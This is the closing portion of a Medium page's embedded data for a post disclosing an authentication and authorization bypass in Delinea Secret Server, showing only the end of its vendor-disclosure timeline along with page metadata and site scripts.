04\u002F03\u002F2024","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_65":{"__typename":"Paragraph","id":"033f6a1b9b22_65","name":"4007","type":"P","href":null,"layout":null,"metadata":null,"text":"03\u002F28\u002F2024 — No update, no response","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_66":{"__typename":"Paragraph","id":"033f6a1b9b22_66","name":"4708","type":"P","href":null,"layout":null,"metadata":null,"text":"04\u002F03\u002F2024 — No update, no response. CERT extended disclosure deadline to 04\u002F10\u002F2024","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_67":{"__typename":"Paragraph","id":"033f6a1b9b22_67","name":"f217","type":"P","href":null,"layout":null,"metadata":null,"text":"04\u002F10\u002F2024 — Public disclosure of the vulnerability","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:033f6a1b9b22_68":{"__typename":"Paragraph","id":"033f6a1b9b22_68","name":"04de","type":"P","href":null,"layout":null,"metadata":null,"text":"04\u002F12\u002F2024 — Delinea acknowledged the finding and is addressing it — https:\u002F\u002Ftrust.delinea.com\u002F?tcuUid=17aaf4ef-ada9-46d5-bf97-abd3b07daae3","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":69,"end":139,"href":"https:\u002F\u002Ftrust.delinea.com\u002F?tcuUid=17aaf4ef-ada9-46d5-bf97-abd3b07daae3","anchorType":"LINK","userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"UserViewerEdge:userId:4bd9d210b6d1-viewerId:lo_3ae7899e42b2":{"__typename":"UserViewerEdge","id":"userId:4bd9d210b6d1-viewerId:lo_3ae7899e42b2","isMuting":false},"PostViewerEdge:postId:adc26c800ad3-viewerId:lo_3ae7899e42b2":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:adc26c800ad3-viewerId:lo_3ae7899e42b2"},"Tag:web-security":{"__typename":"Tag","id":"web-security","displayTitle":"Web Security","normalizedTagSlug":"web-security"},"Tag:web-exploitation":{"__typename":"Tag","id":"web-exploitation","displayTitle":"Web Exploitation","normalizedTagSlug":"web-exploitation"},"Post:adc26c800ad3":{"__typename":"Post","id":"adc26c800ad3","collection":null,"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"f066","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:033f6a1b9b22_0"},{"__ref":"Paragraph:033f6a1b9b22_1"},{"__ref":"Paragraph:033f6a1b9b22_2"},{"__ref":"Paragraph:033f6a1b9b22_3"},{"__ref":"Paragraph:033f6a1b9b22_4"},{"__ref":"Paragraph:033f6a1b9b22_5"},{"__ref":"Paragraph:033f6a1b9b22_6"},{"__ref":"Paragraph:033f6a1b9b22_7"},{"__ref":"Paragraph:033f6a1b9b22_8"},{"__ref":"Paragraph:033f6a1b9b22_9"},{"__ref":"Paragraph:033f6a1b9b22_10"},{"__ref":"Paragraph:033f6a1b9b22_11"},{"__ref":"Paragraph:033f6a1b9b22_12"},{"__ref":"Paragraph:033f6a1b9b22_13"},{"__ref":"Paragraph:033f6a1b9b22_14"},{"__ref":"Paragraph:033f6a1b9b22_15"},{"__ref":"Paragraph:033f6a1b9b22_16"},{"__ref":"Paragraph:033f6a1b9b22_17"},{"__ref":"Paragraph:033f6a1b9b22_18"},{"__ref":"Paragraph:033f6a1b9b22_19"},{"__ref":"Paragraph:033f6a1b9b22_20"},{"__ref":"Paragraph:033f6a1b9b22_21"},{"__ref":"Paragraph:033f6a1b9b22_22"},{"__ref":"Paragraph:033f6a1b9b22_23"},{"__ref":"Paragraph:033f6a1b9b22_24"},{"__ref":"Paragraph:033f6a1b9b22_25"},{"__ref":"Paragraph:033f6a1b9b22_26"},{"__ref":"Paragraph:033f6a1b9b22_27"},{"__ref":"Paragraph:033f6a1b9b22_28"},{"__ref":"Paragraph:033f6a1b9b22_29"},{"__ref":"Paragraph:033f6a1b9b22_30"},{"__ref":"Paragraph:033f6a1b9b22_31"},{"__ref":"Paragraph:033f6a1b9b22_32"},{"__ref":"Paragraph:033f6a1b9b22_33"},{"__ref":"Paragraph:033f6a1b9b22_34"},{"__ref":"Paragraph:033f6a1b9b22_35"},{"__ref":"Paragraph:033f6a1b9b22_36"},{"__ref":"Paragraph:033f6a1b9b22_37"},{"__ref":"Paragraph:033f6a1b9b22_38"},{"__ref":"Paragraph:033f6a1b9b22_39"},{"__ref":"Paragraph:033f6a1b9b22_40"},{"__ref":"Paragraph:033f6a1b9b22_41"},{"__ref":"Paragraph:033f6a1b9b22_42"},{"__ref":"Paragraph:033f6a1b9b22_43"},{"__ref":"Paragraph:033f6a1b9b22_44"},{"__ref":"Paragraph:033f6a1b9b22_45"},{"__ref":"Paragraph:033f6a1b9b22_46"},{"__ref":"Paragraph:033f6a1b9b22_47"},{"__ref":"Paragraph:033f6a1b9b22_48"},{"__ref":"Paragraph:033f6a1b9b22_49"},{"__ref":"Paragraph:033f6a1b9b22_50"},{"__ref":"Paragraph:033f6a1b9b22_51"},{"__ref":"Paragraph:033f6a1b9b22_52"},{"__ref":"Paragraph:033f6a1b9b22_53"},{"__ref":"Paragraph:033f6a1b9b22_54"},{"__ref":"Paragraph:033f6a1b9b22_55"},{"__ref":"Paragraph:033f6a1b9b22_56"},{"__ref":"Paragraph:033f6a1b9b22_57"},{"__ref":"Paragraph:033f6a1b9b22_58"},{"__ref":"Paragraph:033f6a1b9b22_59"},{"__ref":"Paragraph:033f6a1b9b22_60"},{"__ref":"Paragraph:033f6a1b9b22_61"},{"__ref":"Paragraph:033f6a1b9b22_62"},{"__ref":"Paragraph:033f6a1b9b22_63"},{"__ref":"Paragraph:033f6a1b9b22_64"},{"__ref":"Paragraph:033f6a1b9b22_65"},{"__ref":"Paragraph:033f6a1b9b22_66"},{"__ref":"Paragraph:033f6a1b9b22_67"},{"__ref":"Paragraph:033f6a1b9b22_68"}]},"validatedShareKey":"","shareKeyCreator":null},"creator":{"__ref":"User:4bd9d210b6d1"},"inResponseToEntityType":null,"isLocked":false,"isMarkedPaywallOnly":false,"lockedSource":"LOCKED_POST_SOURCE_NONE","mediumUrl":"https:\u002F\u002Fstraightblast.medium.com\u002Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3","primaryTopic":null,"topics":[{"__typename":"Topic","slug":"cybersecurity"}],"isPublished":true,"latestPublishedVersion":"033f6a1b9b22","visibility":"PUBLIC","postResponses":{"__typename":"PostResponses","count":0},"clapCount":25,"allowResponses":true,"isLimitedState":false,"title":"“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN\u002FAuthZ Bypass","isSeries":false,"sequence":null,"uniqueSlug":"all-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3","socialTitle":"","socialDek":"","canonicalUrl":"","metaDescription":"","latestPublishedAt":1714514951665,"readingTime":6.247169811320755,"previewContent":{"__typename":"PreviewContent","subtitle":"Delinea Secret Server is a privileged access management (PAM) solution that helps organizations secure, manage, and monitor privileged…"},"previewImage":{"__ref":"ImageMetadata:1*MM46_6UlXce73BkyxMhfQA.jpeg"},"isShortform":false,"seoTitle":"","firstPublishedAt":1712762940437,"updatedAt":1732833042133,"shortformType":"SHORTFORM_TYPE_LINK","seoDescription":"","viewerEdge":{"__ref":"PostViewerEdge:postId:adc26c800ad3-viewerId:lo_3ae7899e42b2"},"isSuspended":false,"license":"ALL_RIGHTS_RESERVED","tags":[{"__ref":"Tag:web-security"},{"__ref":"Tag:web-exploitation"}],"isNewsletter":false,"statusForCollection":null,"pendingCollection":null,"detectedLanguage":"en","wordCount":1470,"layerCake":6,"responsesLocked":false}}</script><script>window.__MIDDLEWARE_STATE__={"session":{"xsrf":""},"cache":{"cacheStatus":"HIT"}}</script><script src="https://cdn-client.medium.com/lite/static/js/manifest.4ccdef41.js"></script><script src="https://cdn-client.medium.com/lite/static/js/9865.1496d74a.js"></script><script src="https://cdn-client.medium.com/lite/static/js/main.30e52899.js"></script><script src="https://cdn-client.medium.com/lite/static/js/instrumentation.d9108df7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/reporting.ff22a7a5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5049.d1ead72d.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4810.6318add7.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6618.db187378.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2707.a4e221ac.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/9977.933c1c9a.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8599.73cb8339.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5250.9f9e01d2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8346.be5bef41.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2648.26563adf.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8393.826a25fb.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4863.28ab43f6.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6589.ab860fa4.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5642.0f82ef97.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6546.527aa7b2.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/6834.8aa8d357.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4492.3e85e9f5.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/839.1c286b32.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3259.1779fbde.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7975.60bcefe8.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2106.54508268.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/7394.ca29bb88.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/5794.9e8ff5dd.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8204.e2639348.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/4391.59acaed3.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostPage.MainContent.0211664c.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/8414.6565ad5f.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/3974.8d3e0217.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/2527.21406717.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/PostResponsesContent.0eb77899.chunk.js"></script>
<script src="https://cdn-client.medium.com/lite/static/js/responses.editor.5a11f4da.chunk.js"></script><script>window.main();</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'90050244af2e7797',t:'MTczNjU5OTU3OC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"90050244af2e7797","version":"2025.1.0","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"0b5f665943484354a59c39c6833f7078","b":1}' crossorigin="anonymous"></script>
</body></html>